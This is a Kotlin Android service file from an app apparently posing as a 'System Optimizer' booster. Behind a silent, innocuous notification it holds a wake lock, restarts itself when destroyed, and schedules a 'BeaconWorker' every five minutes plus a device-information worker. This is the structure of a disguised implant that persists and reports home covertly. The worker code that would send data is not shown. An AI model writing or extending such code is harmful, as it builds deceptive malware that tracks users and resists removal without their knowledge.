package com.sysopt.booster

import android.app.*
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.os.PowerManager
import androidx.core.app.NotificationCompat
import androidx.work.*

class CoreService : Service() {
    private lateinit var wakeLock: PowerManager.WakeLock
    private var beaconCount = 0

    override fun onCreate() {
        super.onCreate()
        val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
        wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "CoreService")
        wakeLock.acquire(30 * 60 * 1000L)

        startForeground(1001, createNotification())
        scheduleBeacon()
        scheduleDeviceInfo()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int = START_STICKY

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        super.onDestroy()
        if (wakeLock.isHeld) wakeLock.release()

        // Auto-restart
        val restart = Intent(this, CoreService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(restart)
        } else {
            startService(restart)
        }
    }

    private fun createNotification(): Notification {
        val channelId = "core_channel"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(channelId, "System Service", NotificationManager.IMPORTANCE_LOW).apply {
                description = "Device optimization service"
                setShowBadge(false)
                enableVibration(false)
                enableLights(false)
                setSound(null, null)
            }
            (getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager).createNotificationChannel(channel)
        }

        return NotificationCompat.Builder(this, channelId)
            .setContentTitle("System Optimizer")
            .setContentText("Device maintenance running...")
            .setSmallIcon(android.R.drawable.ic_menu_manage)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setOngoing(true)
            .setAutoCancel(false)
            .setSilent(true)
            .build()
    }

    private fun scheduleBeacon() {
        val constraints = Constraints.Builder()
            .setRequiredNetworkType(NetworkType.CONNECTED)
            .build()

        val work = PeriodicWorkRequestBuilder<BeaconWorker>(5, java.util.concurrent.TimeUnit.MINUTES)
            .setConstraints(constraints)
            .setBackoffCriteria(BackoffPolicy.EXPONENTIAL, 1, java.util.concurrent.TimeUnit.MINUTES)
            .setInitialDelay(2, java.util.concurrent.TimeUnit.MINUTES)
            .build()

        WorkManager.getInstance(this)
            .enqueueUniquePeriodicWork("beacon_work", ExistingPeriodicWorkPolicy.KEEP, work)
    }

    private fun scheduleDeviceInfo() {
        val work = OneTimeWorkRequestBuilder<DeviceInfoWorker>()
            .setInitialDelay(10, java.util.concurrent.TimeUnit.SECONDS)
            .build()

        WorkManager.getInstance(this).enqueue(work)
    }
}